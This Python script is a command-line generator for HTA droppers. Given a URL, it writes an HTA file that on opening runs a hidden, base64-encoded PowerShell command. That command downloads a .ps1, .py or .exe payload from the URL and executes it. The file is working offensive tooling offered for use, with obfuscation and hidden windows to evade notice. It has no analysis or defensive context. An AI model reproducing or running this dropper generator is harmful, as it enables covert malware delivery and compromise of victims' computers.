import argparse
import base64

def encode_ps_command(command: str) -> str:
    ps_bytes = command.encode('utf-16le')
    return base64.b64encode(ps_bytes).decode()

def generate_hta_from_url(url: str) -> str:
    # Extract filename based on extension
    if url.endswith(".ps1"):
        ps_command = f"IEX (New-Object Net.WebClient).DownloadString('{url}')"

    elif url.endswith(".py"):
        ps_command = f"""
$pyurl = '{url}';
$pyfile = \"$env:TEMP\\payload.py\";
(New-Object Net.WebClient).DownloadFile($pyurl, $pyfile);
Start-Process 'python.exe' -ArgumentList $pyfile -WindowStyle Hidden;
"""

    elif url.endswith(".exe"):
        ps_command = f"""
$exeurl = '{url}';
$exefile = \"$env:TEMP\\payload.exe\";
(New-Object Net.WebClient).DownloadFile($exeurl, $exefile);
Start-Process $exefile -WindowStyle Hidden;
"""

    else:
        # Fallback: guess from extension
        ps_command = f"""
$url = '{url}';
$filename = \"$env:TEMP\\dropper.tmp\";
(New-Object Net.WebClient).DownloadFile($url, $filename);
if ($url.EndsWith('.ps1')) {{
    IEX (Get-Content $filename -Raw)
}} elseif ($url.EndsWith('.py')) {{
    Start-Process 'python.exe' -ArgumentList $filename -WindowStyle Hidden
}} elseif ($url.EndsWith('.exe')) {{
    Start-Process $filename -WindowStyle Hidden
}} else {{
    Write-Host 'Unsupported file type';
}}
"""

    encoded_command = encode_ps_command(ps_command.strip())

    return f"""
<html>
<head>
<script>
var shell = new ActiveXObject("WScript.Shell");
shell.Run("powershell -WindowStyle Hidden -EncodedCommand {encoded_command}");
</script>
</head>
<body></body>
</html>
"""

def main():
    parser = argparse.ArgumentParser(description="Generate HTA dropper that downloads and executes .ps1, .py, or .exe payloads")
    parser.add_argument("url", help="URL pointing to the payload (.ps1, .py, or .exe)")
    parser.add_argument("-o", "--output", default="dropper.hta", help="Output HTA filename (default: dropper.hta)")
    args = parser.parse_args()

    try:
        hta_payload = generate_hta_from_url(args.url)
        with open(args.output, "w") as f:
            f.write(hta_payload)
        print(f"[+] HTA dropper generated: {args.output}")
        print(f"[+] When executed, it will download and run: {args.url}")
    except Exception as e:
        print(f"[-] Error: {e}")

if __name__ == "__main__":
    main()
